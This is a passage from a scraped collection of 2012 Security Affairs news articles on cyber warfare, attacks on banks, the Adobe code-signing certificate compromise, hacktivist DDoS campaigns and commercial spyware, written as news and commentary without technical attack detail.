mark a significant escalation of the cyber threat.  And they have renewed concerns about still more destructive scenarios that could unfold,\u201d  \u201cFor example, we know that foreign cyber actors are probing America\u2019s critical infrastructure networks.  \n\n\u201cAn aggressor nation or extremist group could use these kinds of cybertools to gain control of critical switches \u2026 [and] derail passenger trains, or even more dangerous, trains loaded with lethal chemicals,\u201d \u201cThey could contaminate the water supply in major cities, or shut down the power grid across large parts of the country.\u201d\n\nAccording Defense Secretary his country is almost ready to adopt new rules of engagement in case a foreign government use cyber weapons to hit U.S..\n\nOne of the most difficult aspects of cyber warfare is to qualify and recognize a state-sponsored offensive, the use of cyber weapons has made very difficult to identify the real responsible of an attack, but Panetta declared that U.S. are able to track back the origin the attack placing pre-emptive response to prevent the assault once detected.\n\n\u201cPotential aggressors should be aware that the United States has the capacity to locate them and to hold them accountable for actions that may try to harm America,\u201d\n\n\u201cConventional wisdom about cyberspace right now is that it\u2019s impossible to attribute attacks to any specific individual or nation state, [but] we have invested a lot in the [Defense] Department in developing that capability,\u201d the official said. \u201cAnd it has improved tremendously.\u201d\n\nIn a speech to business leaders in New York City on Thursday, Defense Secretary Leon Panetta became the first exponent of U.S. Government to blame publicly Iranian state-sponsored hackers for recent cyber attacks against oil and gas companies in the Persian Gulf.\n\nAccording a post of the According to The Washington Post,\n\n\u201cSuch attacks have \u2018renewed concerns about still more destructive scenarios that could unfold\u2019 against the United States, he said in an address to business executives in New York. He asked them to \u2018imagine the impact an attack like this would have on your company.\u2019\n\nPanetta\u2019s remarks on the Middle East incidents were the first from any administration official acknowledging them. In the attack on Aramco, the virus replaced crucial system files with an image of a burning U.S. flag, he said. It also overwrote the files with \u2018garbage\u2019 data, he said.\u201d\n\nThe U.S. official have discussed about U.S. cyber capabilities making specific reference to the offensive aspects, the country is ready to engage a cyber war with any other states thanks to the preparedness in cyber warfare.\n\nPanetta made explicit references to a cyber arsenal developed for offensive purposes speaking to the Business Executives for National Security Group aboard the decommissioned USS Intrepid aircraft carrier in New York.\n\nIt\u2019s very meaningful to ear the discussion of Panetta that explained how U.S. military is able to prompt reply to a cyber attack with cyber and conventional weapons in the total respect of any regulation on armed conflict.\n\n\u201cFor these kinds of scenarios, the department has developed the capability to conduct effective operations to counter threats to our national interests in cyberspace.\u201d he said.\n\nPanetta said that U.S. would follow accepted legal frameworks but we must consider that, at least in the cyber space, there isn\u2019t a global and recognize regulatory.\n\nThe United States are daily hit by thousands of cyber attacks having different origins and motivations, state sponsored hackers, hacktivists, cyber terrorists and cyber criminals conduct a huge quantity of attacks against the Government of Washington and in the majority of cases their remain undetected.\n\nThe principal adversary of U.S. in this sense are Russia and China, but we cannot ignore Iran and North Korea.\n\nAs has often been said to be ready to identify and respond to any type of cyber attack is required the synergy of all social sectors, private industry, government agencies and small businesses need to collaborate and share larger amount of information on such events. The thought of Panetta is to involve also overseas allies, the cyberspace hasn\u2019t boundaries and an international collaboration is a critical aspects of a cyber strategy.\n\n\u201cThe private sector, government, military, our allies all share the same global infrastructure, and we all share the responsibility to protect it,\u201d he said.\n\nDefense Secretary hopes an executive order of President Barack Obama to consolidate a strong commitment to accomplish the objectives, the official declared:\n\n\u201cThere is no substitute for comprehensive legislation, we need to move as far as we can in the meantime,\u201d \u201cWe have no choice because the threat we face, as I\u2019ve said, is already here.\u201d\n\nPanetta is aware of the lack of a global cyber regulatory, this is one of the most critical aspects, without a cyber law framework it\u2019s impossible to exactly define the concept of cyber weapon and regulate their proper use, but U.S. official sustains that this is the right time to act for his country.\n\nThe concerns of Panetta are right, at least 140 countries are developing cyber weapons and cyber offensive tools to attack foreign states.\n\nThe U.S. Government is aware of a possible doomsday scenarios in which cyber terrorism could be combined with physical attacks.\n\n\u201cAn aggressor nation or extremist group could gain control of critical switches and derail passenger trains, or trains loaded with lethal chemicals.  They could contaminate the water supply in major cities, or shut down the power grid across large parts of the country.,\u201d he said.\n\n\u201cThe most destructive scenarios involve cyber actors launching several attacks on our critical infrastructure at once, in combination with a physical attack on our country,\u201d he added. \u201cAttackers could also seek to disable or degrade critical military systems and communications networks.\u201d\n\nAlthough the meaning of these words has long been known to security experts,  I think that the dissemination of these news it is important, the population is a key component in the security chain, first to be informed on the threat in a second phase to be instructed to respond correctly to a cyber attack \u2026 and that is what we will listen in the next Panetta speeches.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/defense", "topic_name": "defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/panetta", "topic_name": "Panetta"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-chain", "topic_name": "security chain"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-offensive", "topic_name": "state-sponsored offensive"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s", "topic_name": "U.S."}]}, {"news_name": "Who is attacking the financial world, and why?", "news_link": "https://securityaffairs.co/wordpress/9346/cyber-crime/who-is-attacking-the-financial-world-and-why.html", "title": "Who is attacking the financial world, and why?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 12, 2012", "body": "\n\nRon Kelson,\n\nPierluigi Paganini,\n\nFabian Martin,\n\nDavid Pace,\n\nBenjamin Gittins\n\n \n\nBank (in)Security:   Between the 1880s and the 1930s, physical bank burglaries were a substantial problem.  To counter these threats bank\u2019s employed vaults to protect their contents from theft, unauthorised use, fire, natural disasters, and other threats.  Vaults were an integral part of the building, using armored walls and a tightly fashioned armoured door secured with a complex lock.\n\nDuring the 1950s, researchers at the Stanford Research Institute invented \u201cERMA\u201d, the Electronic Recording Method of Accounting computer processing system.  ERMA started as a project for the Bank of America in an effort to automate bank book-keeping.  Thirty-two ERMA computers were delivered to the BoA in 1959 for full-time use as the bank\u2019s accounting computer and cheque handling system.\n\nOver time, money began to move in increasingly electronic ways.  Today, the international SWIFT banking network processes financial transactions valued at literally trillions of dollars EVERY day.   It should come as no surprise that robbing banks is an increasingly electronic affair\u2026\n\nToday, the worldwide security community is concerned by the sharp increase in the number of cyber attacks against banking and financial institutions by cyber criminals and state-sponsored hackers.\n\nWhat is at stake?   To quote U.S. Vice Admiral J. Mike McConnel (Rtd), former Director of the US National Security Agency, and Advisor to U.S. President Obama:\n\n\u201cThe world cannot function without an effective banking system, and it is possible to contaminate the database upon which banking operates.  There is no gold standard, no dollar bills, so if you can just contaminate the data in one large bank, you could cause global banking to collapse.\u201d (Dec 2010)\n\nGeneral insecurity of the banking sector:  As the financial and banking system expanded into Automatic Teller Machines a first wave of internal and external attacks began.  Given the impressive physical security of the ATM itself, most of the attacks were mounted through the trivially weak magnetic stripe bank cards.  Attempts to patch the wave of magnetic credit-card attacks with \u201cChip And Pin\u201d technologies failed (Ross Anderson, et al).   Magnetic and chip-and-pin attacks continue today.\n\nMany banks increasingly pushed greater security controls on third party financial organisations, while not applying the same level of security controls internally.   Self-inflicted security failures, like the massive credit-card data breach of Global Payments Inc., are illustrative of the problem.\n\nMost banks are also vulnerable to insider attacks.  The report \u201cInsider Threat Study: Illicit Cyber Activity in the Banking and Finance Sector\u201d (2004) found that in 70% of cases studied, the insiders exploited, or attempted to exploit, systemic vulnerabilities in applications and/or processes or procedures to carry out the incidents.  In 61% of the cases, the insiders exploited vulnerabilities inherent in the hardware, software, or network design.  26% percent of the cases involved the use of someone else\u2019s computer account, physical use of an unattended unsecured terminal, or social engineering.  Nearly all of the surveyed organizations experienced financial loss as a result of the insiders\u2019 actions (91%).\n\nInstead of comprehensively and systematically addressing known vulnerabilities, many banks have been content to live with an \u201cacceptable\u201d degree of operating losses.  Most banks hedged their bets with insurance and limited countermeasures, many pursuing various approaches to shift liability, and the costs to implement security controls, to others.\n\nTo date, attacks have been predominantly parasitic.  However, there is concern the threat landscape may be changing.\n\nGrowing waves of cyber attacks:  Banking is an increasingly desirable target for hacktivists, and cyber terrorists who have no desire to live parasitically off the insecurities of the banking system.  Cyber attacks against financial institutions, can create serious economic damage, and obtain extensive media coverage of the operations; a primary objective of these types of attackers.\n\nWar against the banking system of western enemies:  In conventional war, military organizations target and destroy critical infrastructure such as electricity, communications, airports, roads and water supplies.   Banks of foreign governments may become subject to sanctions.   For example in March 2012, Iran was largely cut off from global commerce after the international SWIFT banking network severed ties with many Iranian banks to back EU sanctions against Tehran.\n\nUntil now, the banking sector has been somewhat immune from cyber attacks of the type described by Vice Admiral J. Mike McConnel.   According to Shane Harris in the article \u201cUS: The cyberwar plan\u201d published in the National Journal in 2009: \u201cin the months before the U.S. invasion of Iraq in March 2003, military planners considered a computerized attack to disable the networks that controlled Iraq\u2019s banking system, but they backed off when they realized that those networks were global and connected to banks in France.\u201d    A cyber attack could contribute to, or trigger, the financial collapse of a nation, or even a group of connected nations.\n\nCyber attacks against the banking systems of the west:  Recent reports raised the possibility of Iranian cyber offensive against US banks. This was immediately denied by the Government of Teheran, but the event has now increased discussions on the real level of security of western banking systems. The news was provided by a top Department of Justice official after the observed attacks against Bank of America and JPMorgan Chase.\n\nDoug Johnson, Vice President of risk management policy for the American Bankers Association, and a member of FS-ISAC, is convinced that we will witness an increase in cyber attacks against the banking sector, and that banks of all sizes should prepare now for an increasing offensive against them.\n\nLanny Breuer, assistant Attorney General for the department\u2019s criminal division, defined cybercrime one of the most serious threats to national security declaring: \u201cIt is so hard to get a handle on, because a lot of it is perpetrated by those working abroad who are skilled at what they do, and the anti-virus software most of us use only protects us from known vulnerabilities.\u201d\n\nCyber attacks, state sponsored or not?   Sophisticated malware and botnets are threatening high-value/sensitive computer networks of all sectors, in particular the banking networks.  Unfortunately, due to the cyber attribution problem, it is very hard to distinguish state-sponsored attacks from opportunistic cyber criminal offensives.  As the UK Cyber Strategy Says:\n\n\u201cwith the borderless and anonymous nature of the internet, precise attribution is often difficult and the distinction between adversaries is increasingly blurred.\u201d\u2028 \u2026 \u201cSome states regard cyberspace as providing a way to commit hostile acts \u2018deniably\u2019.\u201d\n\nIn September 2012, Estonia\u2019s State Prosecutor\u2019s Office announced that it was bringing the investigation of the country\u2019s 2007 cyber attack to a close.  The decision to shut down the investigation came after prosecutors failed to pin down the IP addresses, and computers used, during the digital barrage in April and May 2007.   This negative result will only bolster the confidence of 100+ countries investing in cyber-offensive weapons (such as the U.S DARPA\u2019s cyber-offensive \u201cPlan X\u201d ) with impunity.\n\nTo make situations worse, identifying cyber attacks is becoming even more difficult, as confirmed by the study released by the security firm FireEye, named \u201cAdvanced Threat Report\u201d in the first half of 2012.  It provides an overview of the current threat landscape, evolving advanced malware and advanced persistent threat (APT) tactics, and the level of infiltration seen in organisations\u2019 networks today.  The document presents an alarming scenario, with organisations observing an impressive increase in advanced malware bypassing their traditional security defenses.\n\nToday, security experts are frequently discovering that malicious software (malware) is able to elude common defense mechanisms, remaining in stealth for long periods during which it operates surreptitiously.\n\nRapidly escalating attacks on the financial sector.   Between the second half of 2011 and the first half of 2012, the financial services sector has been hit by an increased number of attacks. The industry saw more events in one month alone (May 2012) than in the entire second half of 2011.\n\nThe concern for the wave of cyber attacks is high, considering that The Financial Services Information Sharing and Analysis Center, an industry security group, has recently raised its threat level for cyber attacks to \u201chigh\u201d from \u201celevated.\u201d\n\nHow to mitiate the risks?\n\nIt\u2019s desirable for a joint commitment of banking institutions, governments and also customers.\n\nBanks are increasingly being attacked by agents that have no interest in parasitically living of them, but rather set out on inflicting damaging/fatal blows on them.  Banking and financial institutions, like all organisations, should carefully ask the question: are our long-standing cyber vulnerabilities now becoming significant liabilities in the today\u2019s environment?\n\nAbout the Authors :\nPierluigi Paganini, Security Specialist CISO Bit4ID Srl, is a CEH Certified Ethical Hacker, EC Council and Founder of Security Affairs ( http://securityaffairs.co/wordpress )\nProf. Fabian Martins, ( http://br.linkedin.com/in/fabianmartinssilva )  Banking security expert and Product Development Manager at Scopus Tecnologia, http://www.scopus.com.br/ ) owned by Bradesco Group.\nRon Kelson is Vice Chair of the ICT Gozo Malta Project and CEO of Synaptic Laboratories Limited  r.kelson@synaptic-labs.com .\nBen Gittins is CTO of Synaptic Laboratories Limited. cto@pqs.io\nDavid Pace is Project Manager of the ICT Gozo Malta Project and an IT Consultant  ph: +356 79630221\n\nICT Gozo Malta is a joint collaboration between the Gozo Business Chamber and Synaptic Labs, part funded in 2011 by the Malta Government, Ministry for Gozo, Eco Gozo Project, and a prize winner in the 2012 Malta Government National Enterprise Support Awards.   www.ictgozomalta.eu links to free cyber awareness resources for all age groups.

This time the scenario appears overturned, according a news published few hours ago a huge cyber attack have targeted Iranian infrastructure and communications companies, causing serious damages to Internet connection.\nA state official declared that internet was destroyed inside the country on Wednesday. When Iran is hit by a cyber attack there are few doubts, the probability that the offensive has been conducted by state-sponsored hackers is really high.\n\nThe tensions with Western and especially with Israel give further motivation to a possible attacks of those countries against the historical enemy.\n\nSecretary of the High Council of Cyberspace, Mehdi Akhavan Behabadi announced to Iranian Labour News Agency:\n\n\u201cYesterday we had a heavy attack against the country\u2019s infrastructure and communications companies which has forced us to limit the Internet,\u201d\n\n\u201cPresently we have constant cyber attacks in the country. Yesterday an attack with a traffic of several gigabytes hit the Internet infrastructure, which caused an unwanted slowness in the country\u2019s Internet,\u201d\n\n\u201cAll of these attacks have been organised. And they have in mind the country\u2019s nuclear, oil, and information networks.\u201d\n\nThe statements stress the concept that behind the attack there is an hostile and foreign government, the offensive is directed against critical infrastructures of the country such as telecommunications, energy sector and nuclear facilities.\n\nIt\u2019s too simple to think to Israel as responsible after the recent discussion to the UN of the prime minister Netanyahu, but it must be considered that Iran represents a serious menace for many Western countries. It\u2019s policy could destabilize a critical area and could trigger a dangerous economic crisis in case of conflict.\n\nIran is the forth producer of oil of the world and one of the main suppliers for China, due this reason a conflict could create a diplomatic incident with those countries that don\u2019t want a military action against Teheran.\n\nWarfare experts believe that in case of attack against Iran, the offensive must be really short to avoid the intensification of contrasts in the area, in this optical a series of cyber attacks could seriously damage the country opening the door to a conventional strike.\n\nIn this phase the use of anonymous cyber operations could avoid the judgment of international community .\n\nIran is aware of the potential effect of a cyber attack, it is one of the countries that major is investing in the development of new cyber technologies, it\u2019s is creating new cyber units, promoting patriot hacking groups and developing internal defense systems.\n\nAfter that the international community banned the sale of antivirus and similar security application to Teheran, the government decided to create its own antivirus software.\n\nThe Iran is also trying to move all the resources and hosting inside the country, in a protected network, to avoid cyber offensive in fact the government has decided to deploy an internal network, isolated from outside, to guarantee interconnections also in case of attack. According cyber specialists the network will be completed within next year.\n\nFew weeks ago a commander in Iran\u2019s elite Revolutionary Guards declared that the Government is prepared for a \u201ccyber war\u201d and it is conscious that damages related to a cyber attack could be more dangerous than a conventional offensive.\n\nIs it sufficient an internal network to save Iran from a cyber attack?\n\nAbsolutely no, and the Government knows this, an attack from inside could harm the entire infrastructure, for this reason the authorities are also maintaining an impressive level of monitoring of internet access. Iran is blocking access to tens of thousands of websites because it considers them immoral or because they express anti-government views.\n\nThe social media are dangerous, the Arab spring has demonstrated it, so sites such as Facebook and YouTube are banned and intermittently also services such as Google. The tension inside the country is increasing, world wide community often ignores that Iran is also made by people like us that desire freedom for their children, but in place like that Iran it\u2019s hard to live.\n\nLooking data on Tor usage it could be possible to note that Iran is in the top ten list of countries for use of Tor Network, just after U.S. and the data on directed connected users and connections through bridges give us indication of an ongoing filtering of internet.\n\n\n\n\n\nWhat to expect in the short term?\n\nDifficult to predict, I would say impossible, surely we will observe an intensification of attacks against the country, but also offensive by state-sponsored hackers against institutions, governments and enterprises enemies of Teheran.\n\nMike Wiacek, a manager on Google\u2019s information security team, declared to the NYT his company has pushing out new alert on the increasing of state-sponsored attacks from China but also from Middle Eastern countries.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/banking", "topic_name": "banking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/google", "topic_name": "Google"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/netanyahu", "topic_name": "Netanyahu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oil", "topic_name": "Oil"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "Adobe Code Signing Certificate used to sign malware, who to blame?", "news_link": "https://securityaffairs.co/wordpress/9020/digital-id/adobe-code-signing-certificate-used-to-sign-malware-who-to-blame.html", "title": "Adobe Code Signing Certificate used to sign malware, who to blame?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 30, 2012", "body": "It\u2019s happened again, cyber criminals have stolen digital certificates related to companies recognized reliable to sign malicious code.\n\nThis time the victim is Adobe and according its security chief, Brad Arkin, a group of hackers have signed malware using Adobe digital certificate obtained compromising a vulnerable build server that was used to get code validation from the company\u2019s code-signing system.\n\nThe company advisory wrote by Arkin states:\n\n\u201cWe have identified a compromised build server with access to the Adobe code signing infrastructure. We are proceeding with plans to revoke the certificate and publish updates for existing Adobe software signed using the impacted certificate,\u201d This only affects the Adobe software signed with the impacted certificate that runs on the Windows platform and three Adobe AIR applications* that run on both Windows and Macintosh. The revocation does not impact any other Adobe software for Macintosh or other platforms.\u201d\n\n\n\n \n\n\u201cOur forensic investigation is ongoing. To date we have identified malware on the build server and the likely mechanism used to first gain access to the build server. We also have forensic evidence linking the build server to the signing of the malicious utilities. We can confirm that the private key required for generating valid digital signatures was not extracted from the HSM.\u201d\n\nThe hackers have signed with a valid and legitimate Adobe certificate at least a couple of malicious utilities, a password dumper and a malicious ISAPI filter, the two malicious programs were signed on July 26 of this year.\n\nThe three affected applications are Adobe Muse, Adobe Story AIR applications, and Acrobat.com desktop services.\n\nThe Adobe firm has decided to revoke the certificate to issue new ones for legitimate Adobe products also signed with the stolen certificate after July 10, 2012. We must consider that despite an illegitimate use of the certificate, any code and document signed before the revocation date is considerable as valid.\n\nAn Adobe spokeswoman on the incident stated that the certificate was not actually stolen:\n\n\u201cAdobe has stringent security measures in place to protect its code signing infrastructure. The private keys associated with the Adobe code signing certificates were stored in Hardware Security Modules (HSMs) kept in physically secure facilities. We confirmed that the private key associated with the Adobe code signing certificate was not extracted from the HSM.\u201d\n\nActually it\u2019s not clear when the breach occurred, the company has discovered that it was re-issuing certificates for code that was signed with the compromised signing key after July 10, 2012, that means that the hackers  have been using these files for about three months.\n\nIt is believed the attackers were planning to use them in a large scale attack due the nature of the signed applications.\n\nEvents like this raise concerns on the security level of producer source code and on the chain of trust managed to guarantee on code authenticity. The main problem is how many Adobe\u2019s software were signed by the build server?\n\nAdobe did not identify the product exactly but declared that it isn\u2019t one of the most popular Adobe Reader, Flash Player, Shockwave Player or Adobe AIR.\n\nSome of the principal security firms have already released detection tools to detect the malware signed with Adobe certificate, Sophos for example has released a tool that identify them as Troj/HkCert-A.\n\nLast year was a terrible year for the certification authorities, the number of successful attacks against some major companies reported was really high and totally out of any prediction. Many attacks have had disturbing consequences and it all began, or so we were led to believe, with the case Comodo.\n\nThen came other illustrious victims, like DigiNotar, a Dutch certificate authority owned by VASCO Data Security International. On September 3, 2011, after it had become clear that a security breach had resulted in the fraudulent issuing of certificates, the Dutch government took over operational management of DigiNotar\u2019s systems.Few weeks later the company was declared bankrupt.\n\nThe list is very long \u2026\n\nWhy steal a CA certificate? \n\nMalware production \u2013 Installation for certain types of software could needs that its code is digitally signed with a trusted certificate. By stealing the certificate of a trusted vendor reduces the possibility that the malicious software being detected as quickly. That is exactly what happened for Stuxnet virus.\n\nEconomic Frauds \u2013 digital signature give a warranty on who signed a document and user can decide if trust the person or company who signed the file and if trust the organization who issued the certificate. If a digital certificate is stolen we will suffer of an identity theft with serious consequences.\n\nSome bot, like happened in the case of Zeus banking malware, could be deployed to steal site certificates so that they can fool web browsers into thinking that a phishing site is a legitimate bank web site.\n\nCyber warfare operations\u2013 Criminals or governments could use the stolen certificates to conduct \u201cman-in-the-middle\u201d attacks, tricking users into thinking they were at a legitimate site when in fact their communications were being secretly tampered and intercepted. That is for example what occurred in the DigiNota case \u2026 companies like Facebook, Google and also agencies like CIA, MI6 were targeted in Dutch government certificate hack.\n\nPersonally I believe that the attack has with primary purpose the cyber espionage and it is high probably that we are facing with state-sponsored hackers that since now have had the opportunity to spread malicious code recognized as legitimate.\n\nFor information the certificate revocation will affect the following certificate:\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/adobe", "topic_name": "Adobe"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/digital-certificates", "topic_name": "digital certificates"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/digital-signature", "topic_name": "Digital signature"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pki", "topic_name": "PKI"}]}, {"news_name": "Are they Islamic hacktivists?

The application is very simple and written using a scripting language with a friendly console, users had only to click the \u201cstart\u201d button to participate to the offensive.\n\nWhile a classic botnet, although is very efficient, is quite simple to detect due the presence of anomalous traffic from/to  the Command & Control servers in this case the presence of volunteers complicates the mitigation of the attack.\n\nConsider also that the involvement of volunteers launching attacks from their own machines makes hard to  isolate malicious traffic and impossible to block it \u201cbeheading\u201d the control servers.\n\nThe group claimed the attack on Pastbin naming itself \u201cMrt. Izz ad-Din al-Qassam Cyber Fighters\u201d, it announced that it involvement in the organization of all the recent attacks from Wells Fargo to the ones against U.S. Bank and PNC Financial Services Group. The group has motivated the attack as revenge for the affront of the video denigrating the Prophet Muhammad.\n\nDespite DDoS attacks are usually not sophisticated they represent a serious cyber threat due the capability to interrupt the providing of a web servers. Banks, financial institutions and other companies that have as core business on line web services are prepared to these attacks but the dimension of offensive may also drop prepared defenses.\n\nAccording Atif Mushtaq, a security researcher at FireEye who has analyzed the attack, the dimension of the bank targeted and of its defensive capabilities let us think that the attacker have constituted a network of hundreds of thousands of computers.\n\nOn the difficulty to manage incoming traffic from a network of volunteers Mushtaq said:\n\n\u201cThere\u2019s no way you can distinguish between the benign traffic and this DDoS traffic,\u201d\n\n\u201cIt\u2019s simply mixed up.\u201d\n\nThe singular modality of DDoS used is just one aspect of the story, on the other end there is U.S. government that blamed Iran for the offensive, finding several similitudes with past attacks against U.S. institutions and organizations.\n\nDifficult to discover the truth, we live in the era of misinformation, wars are made with cyber weapons and social media are used often to give a different perception of the reality.\n\nU.S. and Israel are aware that time is running out, soon Iran will have it\u2019s atomic arsenal and will represent a serious dangerous for western countries. The time is right for an attack and many experts believe that a strike is really imminent, today Israeli Prime Minister Benyamin Netanyahu has drawn a red line on the drawing of a bomb that has been shown to \u2018General Assembly of the United Nations\u201d to explain that by next summer the \u201cIran will have reached the final stage in the production of uranium necessary for the realization of its first nuclear device\u201d.\n\n\u201cIt\u2019s not a question of whether Iran will get the bomb. The question is at what stage can we stop Iran from getting the bomb,\u201d\n\n\u201cWho among you would feel safe in the Middle East? Who would be safe in Europe? Who would be safe in America? Who would be safe anywhere?\u201d\n\n\u201cI ask, given this record of Iranian aggression without nuclear weapons, just imagine Iranian aggression with nuclear weapons,\u201d\n\n\n\n \n\n\u201cAs the prime minister said, the United States and Israel share the goal of preventing Iran from acquiring a nuclear weapon,\u201d said spokesman Tommy Vietor of the National Security Council.\n\nThe group of Izz ad-din Al qassam isn\u2019t the only one engaged in offensive in retaliation for Innocence of Muslims, The Pakistan Cyber Army also conducted a protest campaign against many small businesses and also the U.S. Department of Agriculture, Bank of America, and New York Stock Exchange.\n\nAfter the defacing of the Persia Bank website they posted the following message:\n\n\u201cYou Are Provoking The Anger Of PeaceFull Muslims! / Stop This / Otherwise You WOn\u2019t Be Able To Stop Us.\u201d\n\nThe question is, who really is behind these groups? Are they state-sponsored hackers?\n\nIt could be possible but in this case they are simply giving a pretext to western governments to blame Iran and other states. Which is the sense of these protests?\n\nNetanyahu today also said to be \u201ctotally agree\u201d with U.S. President Barack Obama, who declared that \u201can Iran with nuclear weapons is not a challenge that can be contained\u201d and the U.S. will \u201cthat who must \u201cto stop it.\n\nAre we really close to an attack?\n\nCyber attack or conventional offensive, that is the question.\n\nDo not forget, however, the crucial role of Iran in the world oil production, an attack could plunge financial markets and trigger a Economic 11/9 \u2026 which is the lesser evil?\nIs world economy ready to contain the raise of oil price? Which will be the position of Russia on the attack against Iran?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/banking", "topic_name": "banking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/netanyahu", "topic_name": "Netanyahu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oil", "topic_name": "Oil"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s", "topic_name": "U.S."}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s-bank", "topic_name": "U.S. Bank"}]}, {"news_name": "Malware,Botnet & cyber threats,what is happening to the cyberspace?", "news_link": "https://securityaffairs.co/wordpress/8926/cyber-crime/malwarebotnet-cyber-threatswhat-is-happening-to-the-cyberspace.html", "title": "Malware,Botnet & cyber threats,what is happening to the cyberspace?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 26, 2012", "body": " \n\nDay by day we read about the discovery of new cyber threats that menace the integrity of user\u2019s machines, a multitude of agents developed by cybercriminals or by state-sponsored researchers that operate stealing sensible information and in many cases destroying  targets.\n\nEvery machine that is connected to internet is exposed to serious risk to be compromised, in many cases, also having all the common defense systems in place due the exploit of zero days vulnerabilities.\n\nThere are several consequences to this malware diffusion, first of all the economic loss of the entity hit by cyber attacks, it must be considered a cross effect in many sectors of social texture from Small business to Large Industry.\n\nSmall business for example is one of the most damaged sector, the budget reserved by the companies for cyber security is usually limited and the global economic crisis has  worsened the situation exposing the businesses to continuous attacks most of them also undetected. But small business is directed linked to other sectors, in many cases small companies works directly as supplier for large industry and in the security chain they represent the weakest link that hackers hit to penetrate large organization. Similar scenario is very common in the last wave of APT (Advanced persistent threat) attacks that has hit for example defense companies all over the world.\n\nIf small business suffers the attacks the Governments and Large Industry are no better, the diffusion of malware is increased in impressive way in frequency of attacks and complexity of the malicious agents spread, the main purpose of malware is the cyber espionage, in fact sensible information and intellectual properties are privileged targets of cybercrime and foreign governments.\n\nThinks that cyber espionage malware are mainly developed by cybercriminal or governments is wrong, the cyberspace is also crowded by malicious agent sold by legitimate company for cyber espionage purpose. As denounced by Assange on its SpyFile web site, many legitimate companies are selling espionage products, acquired by private companies and intelligence agencies, to spy on competitors and opponents.\n\nTo provide some sample let\u2019s remind the discovery made by Doctor Web firm, a Russian anti-virus company, that in August has detected a cross-platform Trojan horse that is able to gain full control of its victims and it is also able to can render the system unusable. The agent, named dubbed BackDoor.DaVinci.1, runs both in Windows and Mac OS X and what is singular is the characteristics of the Mac OS X release that for the first time implements rootkit technologies to hide malware processes and files. According the info available on internet, the trojan has been designed by the Italian HackingTeam a security firm  which is specialized in the development of offensive solutions for cyber investigations.\n\nThe Davinci malware is not a unique case, many companies are working on similar projects, FinFisher for example is another powerful cyber espionage agent developed by Gamma Group that is able to secretly spy on target\u2019s computers intercepting communications, recording every keystroke and taking the complete control of the host. Unfortunately, although similar instruments designed for justifiable purposes, such as support for investigations and prevention of crime and terrorism, are too easily sold to governments that use them bloodthirsty for tracking and persecution of dissidents.  Another factor that is contributing is sensible mode to the rapid diffusion of malware and of dangerous botnets is the simplicity to acquire bot agents on the web, it has been also consolidated a \u201cmalware as service\u201d model in which cyber criminals support the development of malicious networks for ordinary crime \u2026 a scaring alliance.\n\nIt\u2019s quite simple to find on internet, and also in the Deep Web, on forums and web site published in the underground to exchange exploit packages continuously updated thanks to collaboration of hackers and criminals, a new markets is growing with an amazing trend involving also young person the desire to measure their capabilities in this fashioning field and that desire to make easy earns.\n\nThe rapid evolution of cyber threats has motivated several 